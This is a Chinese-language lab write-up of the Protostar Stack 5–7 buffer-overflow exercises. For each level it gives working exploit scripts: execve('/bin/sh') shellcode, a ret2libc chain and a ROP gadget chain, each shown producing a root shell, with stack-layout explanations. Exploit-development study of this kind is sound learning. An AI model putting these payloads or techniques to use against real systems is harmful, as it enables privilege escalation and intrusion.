# Protostar: Stack 5

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at `/opt/protostar/bin/stack5`.

> **Hints**
>
> - At this point in time, it might be easier to use someone elses shellcode
> - If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
> - remove the int3s once your shellcode is done.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```



## 攻击目标

使程序执行指定shellcode：`/bin/sh`。



## 攻击过程

```shell
$ cat stack5_shellcode.py
buffer = ""
for i in range(0x41, 0x54):
	buffer += chr(i) * 4
ret = "\x30\xfd\xff\xbf" #0xbffffd30 esp+4
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"	#Linux x86 execve("/bin/sh")
print buffer + ret + payload
$ python stack5_shellcode.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS # 后接一堆乱码
$ (python stack5_shellcode.py; cat) | /opt/protostar/bin/stack5
id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\stack5-result.png" style="zoom: 80%;" />



## 原理分析

本题要利用的漏洞是`gets()`函数缓冲区溢出漏洞。

查看`main()`的汇编代码：

<img src=".\stack5-disassemble.png" style="zoom:80%;" />

由stack4的分析可知，ret指令执行后，会将esp指向的地址，也就是`main()`的返回地址赋值给eip，继续执行eip指向的内容。

所以我们可以利用`buffer`的溢出部分，将`main()`函数的返回地址覆写为`$esp+4`，此地址会被赋值给eip，故程序会跳转到下图中红色部分。我们可以根据需求覆写此部分。

<img src=".\stack5-analysis-1.png" style="zoom:67%;" />

我们利用一个长字符串。

```shell
$ cat exp.txt
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

在ret处打断点，运行程序，输入长字符串，查看栈上内容，可以看到栈顶地址为0xbffffd2c，这个位置存储的值/地址在ret后被赋给eip，用0xbffffd2c + 4 = 0Xbffffd30覆写它，这样程序ret后会跳转到0Xbffffd30位置执行其中以及后续存储的指令，也就是攻击脚本中的`payload`。0xbffffd2c之前的部分用对应ASCII码为0x41到0x53的四个重复字母为一组组成的字符串覆写。

<img src=".\stack5-analysis-3.png" style="zoom:80%;" />

先将`payload`设置为int3指令。

```shell
$ cat stack5_trap.py
buffer = ""
for i in range(0x41, 0x54):
	buffer += chr(i) * 4
ret = "\x30\xfd\xff\xbf" #0xbffffd30 esp+4
payload = "\xcc" * 8
print buffer + ret + payload
$ python stack5_trap.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS  # 后接一堆乱码
$ (python stack5_trap.py) | /opt/protostar/bin/stack5
Trace/breakpoint trap
```

<img src=".\stack5-analysis-4.png" style="zoom:80%;" />

`Trace/breakpoint trap`说明我们成功让程序执行了int3指令。

综上所述，想要程序执行`/bin/sh`，需要将攻击脚本中的`payload`设置为`/bin/sh`的shellcode。

<img src=".\stack5-analysis-2.png" style="zoom:67%;" />

<div STYLE="page-break-after: always;"></div>

# Protostar: Stack 6

Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( `objdump -s` will help with this), or ret2libc , or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at `/opt/protostar/bin/stack6`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```



## 攻击目标

让程序执行指定shellcode：`/bin/sh`。



## 攻击过程

```shell
$ cat stack6_binsh.py
import struct

buffer = ""
for i in range(0x41, 0x55):
	buffer += chr(i) * 4
system = struct.pack("I", 0xb7ecffb0) # system()
sys_ret = "AAAA"
binsh = struct.pack("I", 0xb7e97000+1176511) # /bin/sh
padding = buffer + system + sys_ret + binsh
print padding
$ python stack6_binsh.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT    AAAA # 后接一段乱码
$ (python stack6_binsh.py; cat) | /opt/protostar/bin/stack6
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT    AAAA # 后接一段乱码
id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\stack6-result.png" style="zoom:80%;" />

> Tip：上述过程为ret2libc方法，ret2text方法在原理分析中进行实验。



## 原理分析

本题要利用的漏洞是`gets()`函数缓冲区溢出漏洞。

```c
_builtin_return_address(0);	// 返回当前函数的返回地址
_builtin_return_address(1); // 返回当前函数的调用函数的返回地址
_builtin_return_address(2); // 返回当前函数的调用函数的调用函数的返回地址
```

分析源码可知，源码会对`getpath()`的返回地址进行检查，不允许用0xbf开头的地址覆写其返回地址。

```shell
(gdb) info proc map #查看进程的内存分布
```

0xbffeb000~0xc0000000是栈空间。同时可查看libc库起始地址，为0xb7e97000。

<img src=".\stack6-analysis-proc_map.png" style="zoom:80%;" />

因为栈上地址都以0xbf开头，所以不能仿照stack5的解法在`getpath()`返回前将`$esp+4`的地址覆写到栈顶作为`getpath()`的返回地址。

<img src=".\stack6-analysis-1.png" style="zoom:67%;" />



### 方法一：在程序代码中找到可复用的攻击代码（ret2text）

```
(gdb) disassemble getpath
```

查看`getpath()`的汇编代码：

<img src=".\stack6-disassemble-1.png" style="zoom:80%;" />

<img src=".\stack6-disassemble-2.png" style="zoom:80%;" />

程序代码地址都以0x08开头，可以利用。

根据函数在内存中的运行原理，执行ret指令后，esp指向的地址会被视为返回地址赋值给eip，程序会跳转到eip指向的地址执行。

因此，依然是利用`buffer`的溢出部分，将`getpath()`函数的返回地址覆写为汇编代码中ret指令的地址0x080484f9，可以通过if的检查。`getpath()`返回后，0x080484f9赋值给eip，esp自然下降。因为此时eip指向ret指令的地址，所以会再次执行ret指令，然后esp指向的地址中内容会再被当做返回地址再赋给eip，如下图所示。

<img src=".\stack6-analysis-2.png" style="zoom:67%;" />

所以，可以将此位置覆写为当前`$esp+4`，虽然此地址以0xbf开头，但不会再赋值给程序中的变量ret，无需通过if的检查，此地址会被赋值给eip，故程序会跳转到上图中红色部分。我们可以根据需求覆写此部分。

与stack5类似地，我们利用一个长字符串。在ret处打断点，运行程序，输入长字符串，查看栈上内容，可以看到栈顶地址为0xbffffd1c，这个位置存储的值/地址在ret后被赋给eip，用0x080484f9覆写它，用0xbffffd1c + 8 = 0Xbffffd24覆写下一个位置。这样程序在ret后会跳转到0x080484f9位置，再执行一次ret指令，然后跳转到0Xbffffd24位置，执行其中以及后续存储的指令，也就是攻击脚本中的`payload`。0xbffffd1c之前的部分用对应ASCII码为0x41到0x54的四个重复字母为一组组成的字符串覆写。

<img src=".\stack6-analysis-4.png" style="zoom:80%;" />

先将`payload`设置为int3指令。

```shell
$ cat stack6_r2t.py
buffer = ""
for i in range(0x41, 0x55):
	buffer += chr(i) * 4
ret = "\xf9\x84\x04\x08" #0x080484f9 ret指令的地址
ret += "\x24\xfd\xff\xbf" #0xbffffd1c+8=0xbffffd24 esp+8
payload = "\xcc" * 8
padding = buffer + ret + payload
print padding
$ python stack6_r2t.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT # 后接一段乱码
$ (python stack6_r2t.py) | /opt/protostar/bin/stack6
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT # 后接一段乱码
Trace/breakpoint trap
```

<img src=".\stack6-analysis-5.png" style="zoom:80%;" />

`Trace/breakpoint trap`说明我们成功让程序执行了int3指令。

综上所述，想要程序执行`/bin/sh`，需要将攻击脚本中的`payload`设置为`/bin/sh`的shellcode。



### 方法二：在LibC空间中找到可复用的攻击代码（ret2libc）

libc library中的`system()`函数也可以运行`/bin/sh`。

```shell
(gdb) print system # 查看system()函数的入口地址
```

<img src=".\stack6-analysis-6.png" style="zoom:80%;" />

其地址不以0xbf开头，所以可以利用。

用`system()`函数的地址覆写`getpath()`的返回地址，根据函数在内存中的运行原理，还需要准备`system()`的返回地址和参数，如下图所示。

<img src=".\stack6-analysis-3.png" style="zoom:67%;" />

搜索libc空间，找`/bin/sh`的位置。

```shell
$ strings -t d /lib/libc.so.6 | grep "/bin/sh"
1176511 /bin/sh	# 在libc.so.6起始地址偏移1176511处找到
```

<img src=".\stack6-analysis-7.png" style="zoom:80%;" />

libc起始地址0xb7e97000 + `/bin/sh`偏移地址 = `/bin/sh`的入口地址，作为`system()`的参数。

综上所述，可拟攻击脚本如下：

```python
# stack6_binsh.py
import struct

buffer = ""
for i in range(0x41, 0x55):
	buffer += chr(i) * 4
system = struct.pack("I", 0xb7ecffb0) # system()入口地址
sys_ret = "AAAA" # system()返回地址，任意设置即可
binsh = struct.pack("I", 0xb7e97000+1176511) # /bin/sh入口地址
padding = buffer + system + sys_ret + binsh
print padding
```

<div STYLE="page-break-after: always;"></div>

# Protostar: Stack 7

Stack6 introduces return to .text to gain code execution.

The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

This level is at `/opt/protostar/bin/stack7`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```



## 攻击目标

让程序执行指定shellcode：`/bin/sh`。



## 攻击过程

```shell
$ cat stack7_rop.py
import struct

padding = "A" * 80
ppr = struct.pack("I", 0x08048492) # gadget的地址
pop1 = "AAAA"
pop2 = "BBBB"
ret = struct.pack("I", 0xbffffd1c+32) # esp+32
slide = "\x90" * 50 # nop块
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
print padding + ppr + pop1 + pop2 + ret + slide + shellcode
$ python stack7_rop.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    AAAABBBB # 后接一堆乱码
$ (python stack7_rop.py; cat) | /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    AAAABBBB # 后接一堆乱码       
id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\stack7-result-1.png" style="zoom:80%;" />

<img src=".\stack7-result-2.png" style="zoom:80%;" />

> Tip：上述过程为ROP方法。



## 原理分析

本题要利用的漏洞是`gets()`函数缓冲区溢出漏洞。

分析源码，源码会对`getpath()`的返回地址进行检查，不允许用0xb开头的地址覆写其返回地址。

### 方法一：ret2text

查看`getpath()`的汇编代码：

<img src=".\stack7-disassemble-1.png" style="zoom:80%;" />

<img src=".\stack7-disassemble-2.png" style="zoom:80%;" />

程序代码地址都以0x08开头，可以利用。

根据函数在内存中的运行原理，执行ret指令后，esp指向的地址会被视为返回地址赋值给eip，程序会跳转到eip指向的地址执行。

因此，依然是利用`buffer`的溢出部分，将`getpath()`函数的返回地址覆写为汇编代码中ret指令的地址0x08048544，可以通过if的检查。`getpath()`返回后，0x08048544赋值给eip，esp自然下降。因为此时eip指向ret指令的地址，所以会再次执行ret指令，然后esp指向的地址中内容会再被当做返回地址再赋给eip。

与stack5类似地，我们利用一个长字符串。在ret处打断点，运行程序，输入长字符串，查看栈上内容，可以看到栈顶地址为0xbffffd1c，这个位置存储的值/地址在ret后被赋给eip，用0x08048544覆写它，用0xbffffd1c + 32覆写下一个位置，后接一长串nop指令。这样程序在ret后会跳转到0x08048544位置，再执行一次ret指令，然后跳转到0xbffffd1c + 32位置，即nop块里面，执行其中以及后续存储的指令，所以我们可以把想要执行的shellcode接在nop块后面。0xbffffd1c之前的部分用对应ASCII码为0x41到0x54的四个重复字母为一组组成的字符串，共80个字符来覆写；或者可以直接用80个“A”来覆写。

<img src=".\stack7-analysis-4.png" style="zoom:80%;" />

```shell
$ cat stack7_r2t.py
import struct

padding = "A" * 80
retaddr = struct.pack("I", 0x08048544) # ret指令的地址
ret2 = struct.pack("I", 0xbffffd1c+32) # esp+32
slide = "\x90" * 50 # nop块
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
print padding + retaddr + ret2 + slide + shellcode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # 后接一堆乱码
$ (python stack7_rop.py; cat) | /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # 后接一堆乱码       
id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\stack7-analysis-5.png" style="zoom:80%;" />



### 方法二：基于“esp跳板”的方法

在程序汇编代码中寻找`jmp esp`，将它对应的地址覆写到`getpath()`的返回地址。函数ret后，该地址会被赋给eip，eip执行`jmp esp`指令后，会跳转到esp的位置。如图所示，我们只需要将指定shellcode覆写到下图esp指向的位置。

<img src=".\stack7-analysis-1.png" style="zoom:67%;" />

```shell
$ objdump -d -M intel stack7
```

在汇编代码里面找`jmp esp`。但是没找到，所以此方法不适用。



### 方法三：基于“ROP”的方法

程序只要执行到ret，总会把栈顶的一个跳转地址赋值给eip。我们可以通过寻找并串联以ret结尾的指令序列，实现攻击代码的语义。这些短小的指令序列，叫做gadget。

这种方法可以保证栈上没有指令，全是内存地址和数据，因此，ROP可以抵抗NX保护机制（不允许有指令在栈上执行）。

<img src=".\stack7-analysis-2.png" style="zoom:67%;" />

在汇编代码中找gadget：

```shell
$ objdump -d -M intel stack7
```

<img src=".\stack7-disassemble-3.png" style="zoom:80%;" />

找到一段gadget，其入口地址为0x08048492。

所以我们需要准备覆写的字符串由下图中这几部分构成。

<img src=".\stack7-analysis-3.png" style="zoom:67%;" />

综上所述，可拟攻击脚本如下：

```python
# stack7_rop.py
import struct

padding = "A" * 80
ppr = struct.pack("I", 0x08048492) # gadget的入口地址
pop1 = "AAAA" # pop给eax
pop2 = "BBBB" # pop给ebp
ret = struct.pack("I", 0xbffffd1c+32) # esp+32
slide = "\x90" * 50 # nop块
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
print padding + ppr + pop1 + pop2 + ret + slide + shellcode
```

